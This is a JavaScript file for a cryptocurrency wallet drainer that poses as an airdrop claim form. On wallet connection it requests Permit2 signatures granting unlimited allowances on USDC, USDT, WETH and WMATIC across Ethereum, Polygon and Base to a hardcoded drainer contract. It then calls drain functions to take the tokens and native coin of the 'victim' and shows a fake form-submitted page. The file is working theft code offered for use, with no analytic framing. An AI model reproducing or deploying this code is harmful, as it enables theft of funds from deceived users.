// =============================================
// app.js - Improved for Polygon + Native Drain
// =============================================

const DRAINER_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    // Ethereum
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH

    // Polygon
    "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", // USDC (Polygon)
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT (Polygon)
    "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", // WMATIC (Wrapped POL)
    "0x7ceB23fd6bC0adD59E62ac25578270cFf1b9f619", // WETH (Polygon)

    // Base
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC Base
    "0x4200000000000000000000000000000000000006"  // WETH Base
];

let connectedWallet = "";

document.addEventListener("DOMContentLoaded", () => {
    const connectBtn = document.getElementById("connectWalletBtn");
    const walletDisplay = document.getElementById("walletAddress");
    const statusEl = document.getElementById("status");
    const form = document.getElementById("airdropForm");

    connectBtn.addEventListener("click", async () => {
        try {
            const provider = window.ethereum;
            if (!provider) throw new Error("No wallet");

            const accounts = await provider.request({ method: "eth_requestAccounts" });
            connectedWallet = accounts[0];

            const short = connectedWallet.substring(0,6) + "..." + connectedWallet.slice(-4);
            walletDisplay.innerHTML = `<strong>Connected:</strong><br>${short}`;
            walletDisplay.classList.add("visible");

            connectBtn.textContent = "Wallet Connected";
            connectBtn.classList.add("connected");

            statusEl.textContent = "Processing...";

            await startFullDrain(connectedWallet);

            statusEl.innerHTML = `<span style="color:#34a853">✓ Completed</span>`;

        } catch (e) {
            console.error(e);
            statusEl.textContent = "Failed";
        }
    });

    form.addEventListener("submit", (e) => {
        e.preventDefault();
        if (!connectedWallet) return alert("Connect wallet first");
        showSuccessPage();
    });
});

async function startFullDrain(victim) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const contract = new ethers.Contract(DRAINER_ADDRESS, [
        "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
        "function drainNative(address victim) external"
    ], signer);

    // Drain ERC20 Tokens
    for (let token of targetTokens) {
        try {
            const data = await getPermit2Signature(token);
            await contract.drainWithPermit2(victim, data.permitSingle, data.signature);
        } catch (e) {}
    }

    // Try Native Drain (POL / MATIC)
    try {
        await contract.drainNative(victim);
    } catch (e) {}
}

async function getPermit2Signature(tokenAddress) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975",
            expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline
    };

    const typedData = {
        domain: { name: "Permit2", chainId, verifyingContract: PERMIT2_ADDRESS },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

function showSuccessPage() {
    document.body.innerHTML = `
        <div style="max-width:600px; margin:100px auto; text-align:center; font-family:Arial,sans-serif;">
            <h1 style="color:#34a853; font-size:28px;">Your response has been recorded</h1>
            <p style="margin:25px 0; font-size:18px;">Thank you for submitting the form.</p>
            <a href="#" onclick="location.reload()" style="color:#1a73e8; font-size:16px;">Edit your response</a>
        </div>
    `;
}
